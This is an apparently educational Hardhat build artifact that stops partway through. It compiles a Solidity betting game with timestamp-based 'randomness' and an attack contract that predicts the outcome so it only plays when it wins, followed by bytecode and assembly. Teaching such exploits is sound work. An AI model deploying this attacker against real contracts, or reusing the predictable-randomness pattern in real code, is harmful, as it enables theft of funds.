{
	"id": "0e8b23c3fc1d3e1f242a2f2d7855f016",
	"_format": "hh-sol-build-info-1",
	"solcVersion": "0.4.24",
	"solcLongVersion": "0.4.24+commit.e67f0147",
	"input": {
		"language": "Solidity",
		"sources": {
			"44_attack.sol": {
				"content": "pragma solidity ^0.4.24;\n\ncontract class44_game{\n\n    event win(address);\n    int public kk =1;\n\n    function get_random() public view returns(uint){\n        bytes32 ramdon = keccak256(abi.encodePacked(now));\n        return uint(ramdon) % 1000;\n    }\n\n    function play() public payable {\n        require(msg.value == 0.01 ether);\n        kk+=1;\n        if(get_random()>=500){\n            msg.sender.transfer(0.02 ether);\n            emit win(msg.sender);\n        }\n    }\n\n    function () public payable{\n        require(msg.value >= 1 ether);\n    }\n    \n    constructor () public payable{\n        require(msg.value >= 1 ether);\n    \n    }\n}\n\ncontract class44_attack{\n\n    address public game = 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4;\n\n    class44_game gamecontract = class44_game(game);\n\n    function get_random() public view returns(uint){\n        bytes32 ramdom = keccak256(abi.encodePacked(now));\n        return uint(ramdom) % 1000;\n    }\n\n    function attack() public payable {\n        require(get_random()>=500);\n        gamecontract.play();\n        \n    }\n\n    function () public payable{\n        \n    }\n    \n    constructor () public payable{\n        require(msg.value >= 1 ether);\n    }\n}"
			}
		},
		"settings": {
			"optimizer": {
				"enabled": false,
				"runs": 200
			},
			"outputSelection": {
				"*": {
					"": [
						"ast"
					],
					"*": [
						"abi",
						"metadata",
						"devdoc",
						"userdoc",
						"evm.legacyAssembly",
						"evm.bytecode",
						"evm.deployedBytecode",
						"evm.methodIdentifiers",
						"evm.gasEstimates",
						"evm.assembly"
					]
				}
			}
		}
	},
	"output": {
		"contracts": {
			"44_attack.sol": {
				"class44_attack": {
					"abi": [
						{
							"constant": true,
							"inputs": [],
							"name": "get_random",
							"outputs": [
								{
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [],
							"name": "attack",
							"outputs": [],
							"payable": true,
							"stateMutability": "payable",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "game",
							"outputs": [
								{
									"name": "",
									"type": "address"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"payable": true,
							"stateMutability": "payable",
							"type": "constructor"
						},
						{
							"payable": true,
							"stateMutability": "payable",
							"type": "fallback"
						}
					],
					"devdoc": {
						"methods": {}
					},
					"evm": {
						"assembly": "    /* \"44_attack.sol\":643:1201  contract class44_attack{... */\n  mstore(0x40, 0x80)\n    /* \"44_attack.sol\":695:737  0x5B38Da6a701c568545dCfcB03FcB875f56beddC4 */\n  0x5b38da6a701c568545dcfcb03fcb875f56beddc4\n    /* \"44_attack.sol\":673:737  address public game = 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4 */\n  0x0\n  dup1\n  0x100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"44_attack.sol\":785:789  game */\n  0x0\n  dup1\n  swap1\n  sload\n  swap1\n  0x100\n  exp\n  swap1\n  div\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n    /* \"44_attack.sol\":744:790  class44_game gamecontract = class44_game(game) */\n  0x1\n  exp(0x100, 0x0)\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"44_attack.sol\":1184:1191  1 ether */\n  0xde0b6b3a7640000\n    /* \"44_attack.sol\":1171:1180  msg.value */\n  callvalue\n    /* \"44_attack.sol\":1171:1191  msg.value >= 1 ether */\n  lt\n  iszero\n    /* \"44_attack.sol\":1163:1192  require(msg.value >= 1 ether) */\n  iszero\n  iszero\n  tag_3\n  jumpi\n  0x0\n  dup1\n  revert\ntag_3:\n    /* \"44_attack.sol\":643:1201  contract class44_attack{... */\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x0\n  codecopy\n  0x0\n  return\nstop\n\nsub_0: assembly {\n        /* \"44_attack.sol\":643:1201  contract class44_attack{... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x4))\n      calldataload(0x0)\n      0x100000000000000000000000000000000000000000000000000000000\n      swap1\n      div\n      0xffffffff\n      and\n      dup1\n      0x98107e5b\n      eq\n      tag_2\n      jumpi\n      dup1\n      0x9e5faafc\n      eq\n      tag_3\n      jumpi\n      dup1\n      0xc3fe3e28\n      eq\n      tag_4\n      jumpi\n    tag_1:\n      stop\n        /* \"44_attack.sol\":797:946  function get_random() public view returns(uint){... */\n    tag_2:\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_7\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x0\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_7:\n        /* \"44_attack.sol\":797:946  function get_random() public view returns(uint){... */\n      pop\n      tag_8\n      jump(tag_9)\n    tag_8:\n      mload(0x40)\n      dup1\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"44_attack.sol\":952:1066  function attack() public payable {... */\n    tag_3:\n      tag_10\n      jump(tag_11)\n    tag_10:\n      stop\n        /* \"44_attack.sol\":673:737  address public game = 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4 */\n    tag_4:\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_12\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x0\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_12:\n        /* \"44_attack.sol\":673:737  address public game = 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4 */\n      pop\n      tag_13\n      jump(tag_14)\n    tag_13:\n      mload(0x40)\n      dup1\n      dup3\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"44_attack.sol\":797:946  function get_random() public view returns(uint){... */\n    tag_9:\n        /* \"44_attack.sol\":839:843  uint */\n      0x0\n        /* \"44_attack.sol\":854:868  bytes32 ramdom */\n      dup1\n        /* \"44_attack.sol\":898:901  now */\n      timestamp\n        /* \"44_attack.sol\":881:902  abi.encodePacked(now) */\n      add(0x20, mload(0x40))\n      dup1\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n        /* \"--CODEGEN--\":49:53   */\n      0x20\n        /* \"--CODEGEN--\":39:46   */\n      dup2\n        /* \"--CODEGEN--\":30:37   */\n      dup4\n        /* \"--CODEGEN--\":26:47   */\n      sub\n        /* \"--CODEGEN--\":22:54   */\n      sub\n        /* \"--CODEGEN--\":13:20   */\n      dup2\n        /* \"--CODEGEN--\":6:55   */\n      mstore\n        /* \"44_attack.sol\":881:902  abi.encodePacked(now) */\n      swap1\n      0x40\n      mstore\n        /* \"44_attack.sol\":871:903  keccak256(abi.encodePacked(now)) */\n      mload(0x40)\n      dup1\n      dup3\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n        /* \"--CODEGEN--\":36:189   */\n    tag_16:\n        /* \"--CODEGEN--\":66:68   */\n      0x20\n        /* \"--CODEGEN--\":61:64   */\n      dup4\n        /* \"--CODEGEN--\":58:69   */\n      lt\n        /* \"--CODEGEN--\":51:70   */\n      iszero\n        /* \"--CODEGEN--\":36:189   */\n      iszero\n      tag_17\n      jumpi\n        /* \"--CODEGEN--\":182:185   */\n      dup1\n        /* \"--CODEGEN--\":176:186   */\n      mload\n        /* \"--CODEGEN--\":171:174   */\n      dup3\n        /* \"--CODEGEN--\":164:187   */\n      mstore\n        /* \"--CODEGEN--\":98:100   */\n      0x20\n        /* \"--CODEGEN--\":93:96   */\n      dup3\n        /* \"--CODEGEN--\":89:101   */\n      add\n        /* \"--CODEGEN--\":82:101   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":123:125   */\n      0x20\n        /* \"--CODEGEN--\":118:121   */\n      dup2\n        /* \"--CODEGEN--\":114:126   */\n      add\n        /* \"--CODEGEN--\":107:126   */\n      swap1\n      pop\n        /* \"--CODEGEN--\":148:150   */\n      0x20\n        /* \"--CODEGEN--\":143:146   */\n      dup4\n        /* \"--CODEGEN--\":139:151   */\n      sub\n        /* \"--CODEGEN--\":132:151   */\n      swap3\n      pop\n        /* \"--CODEGEN--\":36:189   */\n      jump(tag_16)\n    tag_17:\n        /* \"--CODEGEN--\":274:275   */\n      0x1\n        /* \"--CODEGEN--\":267:270   */\n      dup4\n        /* \"--CODEGEN--\":263:265   */\n      0x20\n        /* \"--CODEGEN--\":259:271   */\n      sub\n        /* \"--CODEGEN--\":254:257   */\n      0x100\n        /* \"--CODEGEN--\":250:272   */\n      exp\n        /* \"--CODEGEN--\":246:276   */\n      sub\n        /* \"--CODEGEN--\":315:319   */\n      dup1\n        /* \"--CODEGEN--\":311:320   */\n      not\n        /* \"--CODEGEN--\":305:308   */\n      dup3\n        /* \"--CODEGEN--\":299:309   */\n      mload\n        /* \"--CODEGEN--\":295:321   */\n      and\n        /* \"--CODEGEN--\":356:360   */\n      dup2\n        /* \"--CODEGEN--\":350:353   */\n      dup5\n        /* \"--CODEGEN--\":344:354   */\n      mload\n        /* \"--CODEGEN--\":340:361   */\n      and\n        /* \"--CODEGEN--\":389:396   */\n      dup1\n        /* \"--CODEGEN--\":380:387   */\n      dup3\n        /* \"--CODEGEN--\":377:397   */\n      or\n        /* \"--CODEGEN--\":372:375   */\n      dup6\n        /* \"--CODEGEN--\":365:398   */\n      mstore\n        /* \"--CODEGEN--\":3:402   */\n      pop\n      pop\n      pop\n        /* \"44_attack.sol\":871:903  keccak256(abi.encodePacked(now)) */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      keccak256\n        /* \"44_attack.sol\":854:903  bytes32 ramdom = keccak256(abi.encodePacked(now)) */\n      swap1\n      pop\n        /* \"44_attack.sol\":935:939  1000 */\n      0x3e8\n        /* \"44_attack.sol\":925:931  ramdom */\n      dup2\n        /* \"44_attack.sol\":920:932  uint(ramdom) */\n      0x1\n      swap1\n      div\n        /* \"44_attack.sol\":920:939  uint(ramdom) % 1000 */\n      dup2\n      iszero\n      iszero\n      tag_19\n      jumpi\n      invalid\n    tag_19:\n      mod\n        /* \"44_attack.sol\":913:939  return uint(ramdom) % 1000 */\n      swap2\n      pop\n        /* \"44_attack.sol\":797:946  function get_random() public view returns(uint){... */\n      pop\n      swap1\n      jump\t// out\n        /* \"44_attack.sol\":952:1066  function attack() public payable {... */\n    tag_11:\n        /* \"44_attack.sol\":1017:1020  500 */\n      0x1f4\n        /* \"44_attack.sol\":1003:1015  get_random() */\n      tag_21\n        /* \"44_attack.sol\":1003:1013  get_random */\n      tag_9\n        /* \"44_attack.sol\":1003:1015  get_random() */\n      jump\t// in\n    tag_21:\n        /* \"44_attack.sol\":1003:1020  get_random()>=500 */\n      lt\n      iszero\n        /* \"44_attack.sol\":995:1021  require(get_random()>=500) */\n      iszero\n      iszero\n      tag_22\n      jumpi\n      0x0\n      dup1\n      revert\n    tag_22:\n        /* \"44_attack.sol\":1031:1043  gamecontract */\n      0x1\n      0x0\n      swap1\n      sload\n      swap1\n      0x100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"44_attack.sol\":1031:1048  gamecontract.play */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x93e84cd9\n        /* \"44_attack.sol\":1031:1050  gamecontract.play() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0x100000000000000000000000000000000000000000000000000000000\n      mul\n      dup2\n      mstore\n      0x4\n      add\n      0x0\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x0\n      dup8\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_23\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x0\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_23:\n        /* \"44_attack.sol\":1031:1050  gamecontract.play() */\n      pop\n      gas\n      call\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_24\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x0\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x0\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_24:\n        /* \"44_attack.sol\":1031:1050  gamecontract.play() */\n      pop\n      pop\n      pop\n      pop\n        /* \"44_attack.sol\":952:1066  function attack() public payable {... */\n      jump\t// out\n        /* \"44_attack.sol\":673:737  address public game = 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4 */\n    tag_14:\n      0x0\n      dup1\n      swap1\n      sload\n      swap1\n      0x100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n\n    auxdata: 0xa165627a7a7230582059129c5a061551ba94e2795656cab979c82ef12a8168d6eb6ad2598f697730cf0029\n}\n",
						"bytecode": {
							"linkReferences": {},
							"object": "6080604052735b38da6a701c568545dcfcb03fcb875f56beddc46000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff16600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550670de0b6b3a764000034101515156100d157600080fd5b61028d806100e06000396000f300608060405260043610610057576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16806398107e5b146100595780639e5faafc14610084578063c3fe3e281461008e575b005b34801561006557600080fd5b5061006e6100e5565b6040518082815260200191505060405180910390f35b61008c610184565b005b34801561009a57600080fd5b506100a361023c565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b60008042604051602001808281526020019150506040516020818303038152906040526040518082805190602001908083835b60208310151561013d5780518252602082019150602081019050602083039250610118565b6001836020036101000a038019825116818451168082178552505050505050905001915050604051809103902090506103e8816001900481151561017d57fe5b0691505090565b6101f461018f6100e5565b1015151561019c57600080fd5b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166393e84cd96040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b15801561022257600080fd5b505af1158015610236573d6000803e3d6000fd5b50505050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff16815600a165627a7a7230582059129c5a061551ba94e2795656cab979c82ef12a8168d6eb6ad2598f697730cf0029",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH20 0x5B38DA6A701C568545DCFCB03FCB875F56BEDDC4 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x1 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP PUSH8 0xDE0B6B3A7640000 CALLVALUE LT ISZERO ISZERO ISZERO PUSH2 0xD1 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x28D DUP1 PUSH2 0xE0 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN STOP PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x57 JUMPI PUSH1 0x0 CALLDATALOAD PUSH29 0x100000000000000000000000000000000000000000000000000000000 SWAP1 DIV PUSH4 0xFFFFFFFF AND DUP1 PUSH4 0x98107E5B EQ PUSH2 0x59 JUMPI DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0x84 JUMPI DUP1 PUSH4 0xC3FE3E28 EQ PUSH2 0x8E JUMPI JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x65 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x6E PUSH2 0xE5 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x8C PUSH2 0x184 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x9A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0xA3 PUSH2 0x23C JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 DUP1 TIMESTAMP PUSH1 0x40 MLOAD PUSH1 0x20 ADD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE PUSH1 0x40 MLOAD DUP1 DUP3 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT ISZERO ISZERO PUSH2 0x13D JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH1 0x20 DUP4 SUB SWAP3 POP PUSH2 0x118 JUMP JUMPDEST PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB DUP1 NOT DUP3 MLOAD AND DUP2 DUP5 MLOAD AND DUP1 DUP3 OR DUP6 MSTORE POP POP POP POP POP POP SWAP1 POP ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 KECCAK256 SWAP1 POP PUSH2 0x3E8 DUP2 PUSH1 0x1 SWAP1 DIV DUP2 ISZERO ISZERO PUSH2 0x17D JUMPI INVALID JUMPDEST MOD SWAP2 POP POP SWAP1 JUMP JUMPDEST PUSH2 0x1F4 PUSH2 0x18F PUSH2 0xE5 JUMP JUMPDEST LT ISZERO ISZERO ISZERO PUSH2 0x19C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x93E84CD9 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH29 0x100000000000000000000000000000000000000000000000000000000 MUL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x222 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x236 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP STOP LOG1 PUSH6 0x627A7A723058 KECCAK256 MSIZE SLT SWAP13 GAS MOD ISZERO MLOAD 0xba SWAP5 0xe2 PUSH26 0x5656CAB979C82EF12A8168D6EB6AD2598F697730CF0029000000 ",
							"sourceMap": "643:558:0:-;;;695:42;673:64;;;;;;;;;;;;;;;;;;;;785:4;;;;;;;;;;;744:46;;;;;;;;;;;;;;;;;;;;1184:7;1171:9;:20;;1163:29;;;;;;;;643:558;;;;;;"
						},
						"deployedBytecode": {
							"linkReferences": {},
							"object": "608060405260043610610057576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16806398107e5b146100595780639e5faafc14610084578063c3fe3e281461008e575b005b34801561006557600080fd5b5061006e6100e5565b6040518082815260200191505060405180910390f35b61008c610184565b005b34801561009a57600080fd5b506100a361023c565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b60008042604051602001808281526020019150506040516020818303038152906040526040518082805190602001908083835b60208310151561013d5780518252602082019150602081019050602083039250610118565b6001836020036101000a038019825116818451168082178552505050505050905001915050604051809103902090506103e8816001900481151561017d57fe5b0691505090565b6101f461018f6100e5565b1015151561019c57600080fd5b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166393e84cd96040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b15801561022257600080fd5b505af1158015610236573d6000803e3d6000fd5b50505050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff16815600a165627a7a7230582059129c5a061551ba94e2795656cab979c82ef12a8168d6eb6ad2598f697730cf0029",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x57 JUMPI PUSH1 0x0 CALLDATALOAD PUSH29 0x100000000000000000000000000000000000000000000000000000000 SWAP1 DIV PUSH4 0xFFFFFFFF AND DUP1 PUSH4 0x98107E5B EQ PUSH2 0x59 JUMPI DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0x84 JUMPI DUP1 PUSH4 0xC3FE3E28 EQ PUSH2 0x8E JUMPI JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x65 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x6E PUSH2 0xE5 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x8C PUSH2 0x184 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x9A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0xA3 PUSH2 0x23C JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 DUP1 TIMESTAMP PUSH1 0x40 MLOAD PUSH1 0x20 ADD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE PUSH1 0x40 MLOAD DUP1 DUP3 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT ISZERO ISZERO PUSH2 0x13D JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH1 0x20 DUP4 SUB SWAP3 POP PUSH2 0x118 JUMP JUMPDEST PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB DUP1 NOT DUP3 MLOAD AND DUP2 DUP5 MLOAD AND DUP1 DUP3 OR DUP6 MSTORE POP POP POP POP POP POP SWAP1 POP ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 KECCAK256 SWAP1 POP PUSH2 0x3E8 DUP2 PUSH1 0x1 SWAP1 DIV DUP2 ISZERO ISZERO PUSH2 0x17D JUMPI INVALID JUMPDEST MOD SWAP2 POP POP SWAP1 JUMP JUMPDEST PUSH2 0x1F4 PUSH2 0x18F PUSH2 0xE5 JUMP JUMPDEST LT ISZERO ISZERO ISZERO PUSH2 0x19C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x93E84CD9 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH29 0x100000000000000000000000000000000000000000000000000000000 MUL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x222 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x236 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP STOP LOG1 PUSH6 0x627A7A723058 KECCAK256 MSIZE SLT SWAP13 GAS MOD ISZERO MLOAD 0xba SWAP5 0xe2 PUSH26 0x5656CAB979C82EF12A8168D6EB6AD2598F697730CF0029000000 ",
							"sourceMap": "643:558:0:-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;797:149;;8:9:-1;5:2;;;30:1;27;20:12;5:2;797:149:0;;;;;;;;;;;;;;;;;;;;;;;952:114;;;;;;673:64;;8:9:-1;5:2;;;30:1;27;20:12;5:2;673:64:0;;;;;;;;;;;;;;;;;;;;;;;;;;;797:149;839:4;854:14;898:3;881:21;;;;;;;;;;;;;;;49:4:-1;39:7;30;26:21;22:32;13:7;6:49;881:21:0;;;871:32;;;;;;;;;;;;;36:153:-1;66:2;61:3;58:11;51:19;36:153;;;182:3;176:10;171:3;164:23;98:2;93:3;89:12;82:19;;123:2;118:3;114:12;107:19;;148:2;143:3;139:12;132:19;;36:153;;;274:1;267:3;263:2;259:12;254:3;250:22;246:30;315:4;311:9;305:3;299:10;295:26;356:4;350:3;344:10;340:21;389:7;380;377:20;372:3;365:33;3:399;;;871:32:0;;;;;;;;;;;;;;;;854:49;;935:4;925:6;920:12;;;:19;;;;;;;;913:26;;797:149;;:::o;952:114::-;1017:3;1003:12;:10;:12::i;:::-;:17;;995:26;;;;;;;;1031:12;;;;;;;;;;;:17;;;:19;;;;;;;;;;;;;;;;;;;;;;;8:9:-1;5:2;;;30:1;27;20:12;5:2;1031:19:0;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;1031:19:0;;;;952:114::o;673:64::-;;;;;;;;;;;;;:::o"
						},
						"gasEstimates": {
							"creation": {
